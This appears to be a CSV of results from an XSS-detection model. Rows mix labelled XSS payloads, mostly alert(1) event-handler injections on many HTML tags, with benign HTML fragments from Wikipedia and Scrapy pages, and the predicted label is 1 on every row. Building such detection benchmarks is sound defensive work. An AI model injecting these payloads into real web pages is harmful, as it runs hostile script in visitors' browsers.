payload,true_label,predicted_label,similarity_score,inference_time_ms
<time onpointerenter=alert(1)>XSS</time>,1,1,8.8707,20.1605
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;949 </li>",0,1,8.834,32.6166
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,1,8.569,27.9295
"<div draggable=""true"" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable>drop here</ins>",1,1,8.7448,23.9865
"<font onmouseup=""alert(1)"">test</font>",1,1,8.9094,59.9833
	 </span></a></dt><dd>Learn how to debug common problems of your Scrapy spider.</dd>,0,1,8.736,36.8345
"<xmp onbeforepaste=""alert(1)"" contenteditable>test</xmp>",1,1,8.6762,20.7662
"<style>@keyframes slidein {}</style><hr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></hr>",1,1,8.646,27.1878
"	 <sup id=""cite_ref-132"" class=""reference""><a href=""#cite_note-132"">&#91;129&#93; </a> </sup> ",0,1,8.9157,30.8388
"<acronym draggable=""true"" ondrag=""alert(1)"">test</acronym>",1,1,8.8769,23.6857
 </li>,0,1,8.6096,21.7077
<meta id=x tabindex=1 onactivate=alert(1)></meta>,1,1,8.8002,22.9905
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=51"" title=""Edit section: Existential risk"">edit </a><span class=""mw-editsection-bracket"">] ",0,1,8.7998,34.4532
<ul>,0,1,9.0864,13.9957
</dl>,0,1,8.579,16.2593
"<li id=""cite_note-Default_reasoning_and_non-monotonic_logic-105""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Default_reasoning_and_non-monotonic_logic_105-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Default_reasoning_and_non-monotonic_logic_105-1""><sup><i><b>b </b> </i> </sup> </a> ",0,1,8.8649,53.4669
<ul onpointerdown=alert(1)>XSS</ul>,1,1,8.9102,17.9236
"<link rel=""dns-prefetch"" href=""//meta.wikimedia.org"" />",0,1,8.5722,19.0524
"<dt><a class=""reference internal"" href=""topics/developer-tools.html""><span class=""doc"">Using your browser??¢s Developer Tools for scraping",0,1,8.778,23.5184
"<tbody oncut=""alert(1)"" contenteditable>test</tbody>",1,1,8.7539,20.0711
<meter onpointerdown=alert(1)>XSS</meter>,1,1,8.8804,16.6643
"<li id=""cite_note-252""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-252"">^ </a> </b> ",0,1,8.8833,23.6592
"<p oncut=""alert(1)"" contenteditable>test</p>",1,1,8.7914,19.4738
"<link onmousedown=""alert(1)"">test</link>",1,1,8.8528,18.7748
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,1,8.8455,20.1445
<listing onpointerup=alert(1)>XSS</listing>,1,1,8.9166,23.1928
"	 </span> <span class=""reference-text""><a href=""#CITEREFAsadaHosodaKuniyoshiIshiguro2009"">Asada et al. 2009 </a>. ",0,1,8.8143,39.0291
	 </span>,0,1,8.6496,33.1301
"<caption onkeyup=""alert(1)"" contenteditable>test</caption>",1,1,8.7581,28.5447
"<em draggable=""true"" ondrag=""alert(1)"">test</em>",1,1,8.907,28.413
"<style>:target {color: red;}</style><base id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></base>",1,1,8.6718,27.9165
"<ul><li><a href=""#CITEREFDreyfusDreyfus1986"">Dreyfus &amp; Dreyfus 1986 </a> (<a href=""/wiki/Hubert_Dreyfus"" title=""Hubert Dreyfus"">Hubert Dreyfus </a> is a philosopher and critic of AI who was among the first to argue that most useful human knowledge was encoded sub-symbolically. See <a href=""/wiki/Dreyfus%27_critique_of_AI"" class=""mw-redirect"" title=""Dreyfus&#39; critique of AI"">Dreyfus' critique of AI </a>) </li>",0,1,8.6302,68.2221
<s id=x tabindex=1 onactivate=alert(1)></s>,1,1,8.8097,19.3895
"<acronym onmouseover=""alert(1)"">test</acronym>",1,1,8.9053,16.2
"<object onkeydown=""alert(1)"" contenteditable>test</object>",1,1,8.7949,15.7503
"<li><i><a href=""/wiki/Index_of_philosophy_of_mind_articles"" title=""Index of philosophy of mind articles"">more... </a> </i> </li> </ul>",0,1,8.9738,35.297
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,1,8.564,26.1845
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></select>",1,1,8.5798,40.9478
" </div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""3"">",0,1,8.7604,23.4881
"won many visual pattern recognition competitions.<sup id=""cite_ref-schmidhuber2015_246-2"" class=""reference""><a href=""#cite_note-schmidhuber2015-246"">&#91;235&#93; </a> </sup>",0,1,8.9547,44.0485
"      <span class=""fa fa-book""> Read the Docs",0,1,8.7599,17.4612
"<ul><li><a href=""/wiki/Herbert_A._Simon"" title=""Herbert A. Simon"">Herbert Simon </a> quote: <a href=""#CITEREFSimon1965"">Simon 1965 </a>, p.&#160;96 quoted in <a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, p.&#160;109. </li>",0,1,8.8635,45.7321
"<h1 oncut=""alert(1)"" contenteditable>test</h1>",1,1,8.8295,15.2405
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/commands.html"">Command line tool</a></li>",0,1,8.6953,25.4495
"<html oncontextmenu=""alert(1)"">test</html>",1,1,8.8206,18.2384
<form onpointerdown=alert(1)>XSS</form>,1,1,8.8696,15.9764
"<style>:target {color:red;}</style><tr id=x style=""transition:color 1s"" ontransitionend=alert(1)></tr>",1,1,8.7426,21.0891
"<li class=""toclevel-2 tocsection-11""><a href=""#Motion_and_manipulation""><span class=""tocnumber"">4.7 ",0,1,8.6379,22.3505
	 </span> ,0,1,8.6496,14.2627
"<button draggable=""true"" ondrag=""alert(1)"">test</button>",1,1,8.8564,18.6146
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationstart=""alert(1)""></source>",1,1,8.7231,22.6281
<dfn id=x tabindex=1 onfocusin=alert(1)></dfn>,1,1,8.6353,15.4738
"<rt draggable=""true"" ondragend=""alert(1)"">test</rt>",1,1,8.8305,19.8949
<q onpointerenter=alert(1)>XSS</q>,1,1,8.8332,17.2296
"<li><a href=""/wiki/Video_game"" title=""Video game"">Video games </a> </li>",0,1,8.887,22.7785
<dfn onpointerleave=alert(1)>XSS</dfn>,1,1,8.7256,15.5878
"<style>:target {color:red;}</style><title id=x style=""transition:color 1s"" ontransitionend=alert(1)></title>",1,1,8.7357,21.2235
"  <div class=""section"" id=""scrapy-version-documentation"">",0,1,8.8258,14.8645
"<acronym onmouseenter=""alert(1)"">test</acronym>",1,1,8.9346,17.606
"<hgroup onmouseout=""alert(1)"">test</hgroup>",1,1,8.8359,17.8889
<footer onpointerup=alert(1)>XSS</footer>,1,1,8.8747,21.1207
"<li id=""cite_note-Museum_of_Applied_Arts_Exhibition_&#39;&#39;Uncanny_Values&#39;&#39;-349""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Museum_of_Applied_Arts_Exhibition_&#39;&#39;Uncanny_Values&#39;&#39;_349-0"">^ </a> </b> ",0,1,8.9409,46.7577
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,1,8.564,19.8788
"<sub draggable=""true"" ondragenter=""alert(1)"">test</sub>",1,1,8.8001,16.9
"<del onbeforepaste=""alert(1)"" contenteditable>test</del>",1,1,8.6691,15.2127
"<thead onmouseleave=""alert(1)"">test</thead>",1,1,8.8346,18.6048
 ,0,1,9.5403,13.993
<nav onpointerup=alert(1)>XSS</nav>,1,1,8.8395,15.3335
"<style>@keyframes slidein {}</style><spacer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></spacer>",1,1,8.6501,30.0757
"<del oncontextmenu=""alert(1)"">test</del>",1,1,8.8105,18.3192
"<li><a href=""/wiki/Green_computing"" title=""Green computing"">Energy consumption (Green computing) </a> </li>",0,1,8.9404,20.3848
<svg><head onload=alert(1)></head>,1,1,8.9035,15.1014
<isindex id=x tabindex=1 onfocusin=alert(1)></isindex>,1,1,8.735,18.6147
"<style>:target {transform: rotate(180deg);}</style><dialog id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dialog>",1,1,8.6709,24.516
<footer id=x tabindex=1 onbeforedeactivate=alert(1)></footer><input autofocus>,1,1,8.7129,19.4073
<html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>,1,1,8.7626,21.3445
"<li id=""cite_note-76""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-76"">^ </a> </b> ",0,1,8.9094,33.4636
"<basefont onkeydown=""alert(1)"" contenteditable>test</basefont>",1,1,8.7783,16.9931
"<video onkeyup=""alert(1)"" contenteditable>test</video>",1,1,8.8392,16.8242
"<meter onmousemove=""alert(1)"">test</meter>",1,1,8.9075,15.0349
<animate onpointermove=alert(1)>XSS</animate>,1,1,8.7531,16.9215
<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>,1,1,8.7546,22.1195
"<div draggable=""true"" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>",1,1,8.6939,36.1077
"	 <div style=""padding:0em 0.25em"">",0,1,8.7716,20.3585
"<multicol onmouseup=""alert(1)"">test</multicol>",1,1,8.8495,16.5306
"<a onmousedown=""alert(1)"">test</a>",1,1,8.8776,17.5291
"<marquee draggable=""true"" ondragend=""alert(1)"">test</marquee>",1,1,8.7637,19.401
"<button onmouseleave=""alert(1)"">test</button>",1,1,8.8766,19.3543
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=BBC+News&amp;rft.atitle=Artificial+intelligence%3A+Google%27s+AlphaGo+beats+Go+master+Lee+Se-dol&amp;rft.date=2016-03-12&amp;rft_id=https%3A%2F%2Fwww.bbc.com%2Fnews%2Ftechnology-35785875&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,8.8694,69.206
"<caption onbeforecut=""alert(1)"" contenteditable>test</caption>",1,1,8.6954,18.6734
	 </span>,0,1,8.6496,12.1083
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Glossaries_of_science_and_engineering"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0,1,8.5609,44.2722
<th id=x tabindex=1 onfocusin=alert(1)></th>,1,1,8.7673,14.8122
<img id=x tabindex=1 onfocus=alert(1)></img>,1,1,8.7268,20.3975
	 </span> 2018 ,0,1,8.9525,13.8666
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;22??4 </li>",0,1,8.7463,25.6404
 </li>,0,1,8.6096,13.1738
<rp onpointerenter=alert(1)>XSS</rp>,1,1,8.8325,17.3729
"<basefont ondblclick=""alert(1)"">test</basefont>",1,1,8.8367,19.0011
	 </span> </li>,0,1,8.4977,17.7106
"<summary onmouseup=""alert(1)"">test</summary>",1,1,8.8909,17.4777
"<title draggable=""true"" ondragend=""alert(1)"">test</title>",1,1,8.8383,16.8268
"<area draggable=""true"" ondragenter=""alert(1)"">test</area>",1,1,8.8476,18.6711
"<s onmouseenter=""alert(1)"">test</s>",1,1,8.8679,16.4975
"<br onmouseleave=""alert(1)"">test</br>",1,1,8.8571,17.4736
"<li id=""cite_note-417""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-417"">^ </a> </b> ",0,1,8.9044,28.7229
"<wbr onmouseleave=""alert(1)"">test</wbr>",1,1,8.8497,18.1182
"<li><a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">Automated planning and scheduling </a> </li>",0,1,8.7424,21.5751
"<li><a href=""/wiki/Wikipedia:WikiProject_Philosophy"" title=""Wikipedia:WikiProject Philosophy"">Project </a> </li>",0,1,8.8606,22.777
<svg><nav onload=alert(1)></nav>,1,1,8.826,15.5187
"<textarea onmouseup=""alert(1)"">test</textarea>",1,1,8.783,18.2864
"<head onkeypress=""alert(1)"" contenteditable>test</head>",1,1,8.8014,14.0474
	 </span> </a> </i>&#93; </sup>.,0,1,8.6601,17.9008
"<li><a href=""/wiki/Mundaneum"" title=""Mundaneum"">Mundaneum </a><span class=""nowrap"">&#160; ",0,1,8.7814,21.5261
"<style>:target {transform: rotate(180deg);}</style><nobr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nobr>",1,1,8.6792,24.0923
"<dl><dt><i>The <a href=""/wiki/Artificial_brain"" title=""Artificial brain"">artificial brain </a> argument </i> </dt>",0,1,8.9345,24.3324
"<tbody onkeyup=""alert(1)"" contenteditable>test</tbody>",1,1,8.7823,19.407
"	 </span> <span class=""reference-text"">",0,1,8.8351,15.839
"	 </span> <span class=""reference-text"">The act of doling out rewards can itself be formalized or automated into a ""<a href=""/wiki/Reward_function"" class=""mw-redirect"" title=""Reward function"">reward function </a>"". ",0,1,8.5812,33.009
<sub onpointerover=alert(1)>XSS</sub>,1,1,8.8647,15.3761
"<big draggable=""true"" ondragend=""alert(1)"">test</big>",1,1,8.8047,14.8733
	 </span>,0,1,8.6496,15.8218
<bdo onpointermove=alert(1)>XSS</bdo>,1,1,8.7323,19.9089
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/practices.html"">Common Practices</a></li>",0,1,8.7654,25.2456
"<div draggable=""true"" contenteditable>drag me</div><map ondrop=alert(1) contenteditable>drop here</map>",1,1,8.723,24.5069
"<meta onkeydown=""alert(1)"" contenteditable>test</meta>",1,1,8.7971,18.8338
<svg><param onload=alert(1)></param>,1,1,8.7652,15.3031
          <dd>,0,1,8.9801,14.5541
<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>,1,1,8.715,15.7135
<multicol onpointerdown=alert(1)>XSS</multicol>,1,1,8.8684,17.3233
"	 </span></code></a> and <a class=""reference external"" href=""https://docs.python.org/3/library/asyncio.html#module-asyncio"" title=""(in Python v3.8)""><code class=""xref py py-mod docutils literal notranslate""><span class=""pre"">asyncio",0,1,8.6006,34.3949
"<input draggable=""true"" ondragend=""alert(1)"">test</input>",1,1,8.8334,21.2566
"<li id=""cite_note-388""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-388"">^ </a> </b> ",0,1,8.8435,26.9528
<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>,1,1,8.7846,21.7238
"<style>:target {color:red;}</style><meta id=x style=""transition:color 1s"" ontransitionend=alert(1)></meta>",1,1,8.7235,25.7003
<li onpointerleave=alert(1)>XSS</li>,1,1,8.8041,19.6426
		 </div> </div>,0,1,8.5327,18.135
"<a href=""/wiki/Alternating_decision_tree"" title=""Alternating decision tree"">Decision tree </a>:",0,1,8.8246,21.8749
<select onpointerover=alert(1)>XSS</select>,1,1,8.8865,17.3597
	 </span> 2007 ,0,1,8.8952,17.3711
"<style>:target {color: red;}</style><marquee id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></marquee>",1,1,8.5777,27.3179
"<aside onclick=""alert(1)"">test</aside>",1,1,8.9277,21.1891
"<summary ondblclick=""alert(1)"">test</summary>",1,1,8.8798,21.2991
<select id=x tabindex=1 onbeforedeactivate=alert(1)></select><input autofocus>,1,1,8.8092,21.3468
<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>,1,1,8.752,19.6288
"<li><cite id=""CITEREFMinsky1967"" class=""citation book""><a href=""/wiki/Marvin_Minsky"" title=""Marvin Minsky"">Minsky, Marvin </a> (1967). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/computationfinit0000mins""><i>Computation: Finite and Infinite Machines </i> </a> ",0,1,8.7975,51.7382
<frameset><frame id=x onfocus=alert(1)>,1,1,8.7693,20.4308
"<div draggable=""true"" contenteditable>drag me</div><track ondrop=alert(1) contenteditable>drop here</track>",1,1,8.732,24.5068
"<figure draggable=""true"" ondragend=""alert(1)"">test</figure>",1,1,8.7933,16.5274
"<hr draggable=""true"" ondrag=""alert(1)"">test</hr>",1,1,8.8899,17.9521
"<li id=""cite_note-277""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-277"">^ </a> </b> ",0,1,8.9257,25.6847
"<li><cite id=""CITEREFKahnemanSlovicTversky1982"" class=""citation book""><a href=""/wiki/Daniel_Kahneman"" title=""Daniel Kahneman"">Kahneman, Daniel </a>; Slovic, D.; <a href=""/wiki/Amos_Tversky"" title=""Amos Tversky"">Tversky, Amos </a> (1982). <i>Judgment under uncertainty: Heuristics and biases </i>. <i>Science </i>. <b>185 </b>. New York: Cambridge University Press. pp.&#160;1124??1. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.185.4157.1124"">10.1126/science.185.4157.1124 </a>. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-521-28414-1"" title=""Special:BookSources/978-0-521-28414-1""><bdi>978-0-521-28414-1 </bdi> </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/17835457"">17835457 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Judgment+under+uncertainty%3A+Heuristics+and+biases&amp;rft.place=New+York&amp;rft.pages=1124-31&amp;rft.pub=Cambridge+University+Press&amp;rft.date=1982&amp;rft_id=info%3Apmid%2F17835457&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.185.4157.1124&amp;rft.isbn=978-0-521-28414-1&amp;rft.aulast=Kahneman&amp;rft.aufirst=Daniel&amp;rft.au=Slovic%2C+D.&amp;rft.au=Tversky%2C+Amos&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,9.0004,176.9419
"<address onmousedown=""alert(1)"">test</address>",1,1,8.863,16.9289
"<template draggable=""true"" ondragstart=""alert(1)"">test</template>",1,1,8.8303,19.0018
"<ul><li><a href=""/wiki/Outline_of_robotics"" title=""Outline of robotics"">Outline </a> </li>",0,1,8.822,21.0543
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onanimationstart=""alert(1)""></figure>",1,1,8.6498,24.7171
	 </span> </li>,0,1,8.4977,18.494
"<style>:target {transform: rotate(180deg);}</style><a id=x style=""transition:transform 									2s"" ontransitionrun=alert(1)></a>",1,1,8.7098,25.5635
"<mark onmouseout=""alert(1)"">test</mark>",1,1,8.8724,18.3462
"<basefont onbeforepaste=""alert(1)"" contenteditable>test</basefont>",1,1,8.6577,20.1454
"<li><a href=""/wiki/Scientific_method"" title=""Scientific method"">Scientific method </a> </li>",0,1,8.7898,20.0643
	 </span></a></dt>,0,1,8.7577,19.8038
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;712??24, </li>",0,1,8.773,29.2002
<head>,0,1,9.1401,13.8368
"<bdo onbeforecut=""alert(1)"" contenteditable>test</bdo>",1,1,8.6841,17.5482
"<ruby onkeydown=""alert(1)"" contenteditable>test</ruby>",1,1,8.8424,17.7468
"<style>:target {color: red;}</style><bgsound id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bgsound>",1,1,8.6196,27.1765
"<cite onmousedown=""alert(1)"">test</cite>",1,1,8.9008,23.0545
<svg><mark onload=alert(1)></mark>,1,1,8.9118,17.5137
<data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>,1,1,8.7761,22.1833
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationend=""alert(1)""></bdi>",1,1,8.6888,22.8337
"	 </span> <span class=""reference-text"">",0,1,8.8351,16.6364
<style onpointerdown=alert(1)>XSS</style>,1,1,8.8883,22.1256
<big onpointerout=alert(1)>XSS</big>,1,1,8.8059,18.3781
"<shadow onmousemove=""alert(1)"">test</shadow>",1,1,8.9174,15.9891
<body onpointerout=alert(1)>XSS</body>,1,1,8.9054,16.5086
<style onpointerenter=alert(1)>XSS</style>,1,1,8.8501,17.264
"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>",1,1,8.7327,18.3951
"<li>Report bugs with Scrapy in our <a class=""reference external"" href=""https://github.com/scrapy/scrapy/issues"">issue tracker</a>.</li>",0,1,8.6752,28.8472
<frame onpointerup=alert(1)>XSS</frame>,1,1,8.8575,15.1894
"	 </span> <span class=""reference-text""><cite class=""citation magazine"">Roberts, Jacob (2016). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20180819152455/https://www.sciencehistory.org/distillations/magazine/thinking-machines-the-search-for-artificial-intelligence"">""Thinking Machines: The Search for Artificial Intelligence"" </a>. <i>Distillations </i>. Vol.&#160;2 no.&#160;2. pp.&#160;14??3. Archived from <a rel=""nofollow"" class=""external text"" href=""https://www.sciencehistory.org/distillations/magazine/thinking-machines-the-search-for-artificial-intelligence"">the original </a> on 19 August 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">20 March ",0,1,8.8069,77.2786
"<div draggable=""true"" contenteditable>drag me</div><area ondrop=alert(1) contenteditable>drop here</area>",1,1,8.7442,21.4056
"<style>:target {color:red;}</style><button id=x style=""transition:color 1s"" ontransitionend=alert(1)></button>",1,1,8.7349,19.2928
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationend=""alert(1)""></progress>",1,1,8.7384,22.8286
"<li><a href=""/wiki/Firefly_algorithm"" title=""Firefly algorithm"">Firefly algorithm </a> </li>",0,1,8.7615,20.6267
"<dt><a class=""reference internal"" href=""contributing.html""><span class=""doc"">Contributing to Scrapy",0,1,8.6876,20.696
"<dd oncopy=""alert(1)"" contenteditable>test</dd>",1,1,8.7058,16.4017
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,1,8.569,23.5501
"<spacer oncontextmenu=""alert(1)"">test</spacer>",1,1,8.7922,19.8191
"<command draggable=""true"" ondragstart=""alert(1)"">test</command>",1,1,8.7852,17.9115
"<style>:target {transform: rotate(180deg);}</style><address id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></address>",1,1,8.6488,24.5715
"	 <div class=""magnify""><a href=""/wiki/File:D%C3%A9tection_de_personne_-_exemple_3.jpg"" class=""internal"" title=""Enlarge""> </a> </div>A self-driving car system may use a neural network to determine which parts of the picture seem to match previous training images of pedestrians, and then model those areas as slow-moving but somewhat unpredictable rectangular prisms that must be avoided.<sup id=""cite_ref-79"" class=""reference""><a href=""#cite_note-79"">&#91;76&#93; </a> </sup><sup id=""cite_ref-80"" class=""reference""><a href=""#cite_note-80"">&#91;77&#93; </a> </sup> </div> </div> </div>",0,1,8.7621,87.6748
<ins onpointerleave=alert(1)>XSS</ins>,1,1,8.8376,17.7067
"        <script src=""_static/underscore.js""></script>",0,1,8.8659,20.5105
"<center onbeforecut=""alert(1)"" contenteditable>test</center>",1,1,8.7247,22.9309
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;113??14, </li>",0,1,8.7996,23.9201
"<li id=""cite_note-Classical_planning-112""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Classical_planning_112-0"">^ </a> </b> ",0,1,8.872,30.3699
	 </span> 2016 ,0,1,9.0437,17.7697
<keygen onpointerleave=alert(1)>XSS</keygen>,1,1,8.8037,15.4795
<applet onpointermove=alert(1)>XSS</applet>,1,1,8.7655,19.1324
"<li><a href=""#CITEREFNRC1999"">NRC 1999 </a>, pp.&#160;210??11 </li>",0,1,8.808,22.4108
"SRC=""http://ha.ckers.org/.swf"" AllowScriptAccess=""always""",1,1,8.6561,18.3363
&#X000003C;,1,1,9.0578,13.3956
"<li><a href=""/wiki/Medical_robot"" title=""Medical robot"">Medical </a> </li>",0,1,8.8797,20.0342
	 </span> 2018 ,0,1,8.9525,17.068
"<form><input type=search onsearch=alert(1) value=""Hit return"" autofocus>",1,1,8.787,21.4666
<dir onpointerenter=alert(1)>XSS</dir>,1,1,8.8172,19.0384
"	 </span>. <q>After a half-decade of quiet breakthroughs in artificial intelligence, 2015 has been a landmark year. Computers are smarter and learning faster than ever. </q> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Bloomberg+News&amp;rft.atitle=Why+2015+Was+a+Breakthrough+Year+in+Artificial+Intelligence&amp;rft.date=2015-12-08&amp;rft.aulast=Clark&amp;rft.aufirst=Jack&amp;rft_id=https%3A%2F%2Fwww.bloomberg.com%2Fnews%2Farticles%2F2015-12-08%2Fwhy-2015-was-a-breakthrough-year-in-artificial-intelligence&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,8.8811,110.2656
"<li><a href=""/wiki/Erich_von_Holst"" title=""Erich von Holst"">Erich von Holst </a> </li>",0,1,8.7189,28.5831
"<style>:target {color:red;}</style><section id=x style=""transition:color 1s"" ontransitionend=alert(1)></section>",1,1,8.7182,29.0645
<body ontouchstart=alert(1)> ,1,1,8.864,22.731
    </div>,0,1,8.6546,15.6764
	 </span>,0,1,8.6496,15.6424
"	 </span> <span class=""toctext"">Machine ethics ",0,1,8.6871,18.9358
"<div draggable=""true"" contenteditable>drag me</div><content ondrop=alert(1) contenteditable>drop here</content>",1,1,8.7509,28.3065
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Scientific+American&amp;rft.atitle=What+is+%27fuzzy+logic%27%3F+Are+there+computers+that+are+inherently+fuzzy+and+do+not+apply+the+usual+binary+logic%3F&amp;rft_id=https%3A%2F%2Fwww.scientificamerican.com%2Farticle%2Fwhat-is-fuzzy-logic-are-t%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,8.8764,91.9159
"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" ontransitionend=alert(1)></fieldset>",1,1,8.7279,24.2137
"<datalist draggable=""true"" ondragend=""alert(1)"">test</datalist>",1,1,8.8173,25.2135
<ul>,0,1,9.0864,19.0042
<frameset onpointerup=alert(1)>XSS</frameset>,1,1,8.8258,27.8746
"<style>:target {transform: rotate(180deg);}</style><data id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></data>",1,1,8.6874,29.5544
<menuitem id=x tabindex=1 onbeforedeactivate=alert(1)></menuitem><input autofocus>,1,1,8.6718,20.1567
<input type=checkbox id=x onfocusin=alert(1)>,1,1,8.7107,16.073
<rp id=x tabindex=1 ondeactivate=alert(1)></rp><input id=y autofocus>,1,1,8.7319,19.295
"<img draggable=""true"" ondragleave=""alert(1)"">test</img>",1,1,8.7929,19.7077
	 </span> ,0,1,8.6496,14.8093
 </li>,0,1,8.6096,14.7382
<element id=x tabindex=1 ondeactivate=alert(1)></element><input id=y autofocus>,1,1,8.8068,18.808
 </li>,0,1,8.6096,15.1441
</div>,0,1,8.6546,14.2796
